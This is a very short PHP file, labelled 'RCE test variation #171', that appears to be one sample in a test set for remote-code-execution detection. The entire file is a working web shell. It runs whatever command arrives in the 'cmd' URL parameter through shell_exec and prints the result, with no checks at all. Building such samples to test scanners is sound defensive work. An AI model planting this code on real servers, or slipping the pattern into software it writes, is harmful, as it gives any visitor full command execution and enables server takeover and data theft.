<?php
// RCE test variation #171
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>